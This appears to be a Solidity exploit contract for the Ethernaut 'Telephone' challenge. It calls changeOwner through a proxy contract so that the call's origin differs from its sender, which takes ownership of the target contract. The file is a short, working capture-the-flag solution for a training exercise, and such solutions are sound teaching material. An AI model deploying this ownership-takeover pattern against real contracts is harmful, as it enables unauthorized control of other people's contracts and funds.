// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract ProxySender {

    Telephone public telephone;

    address _telephoneAddress;

    constructor(address payable telephoneAddress) {
        telephone = Telephone(telephoneAddress);
        _telephoneAddress = telephoneAddress;
    }

    function proxyOwner(address _owner) public {
        (bool ok,) = _telephoneAddress.call{value: 0}(abi.encodeWithSignature("changeOwner(address)", _owner));
		require (ok, "Failed...");
    }
}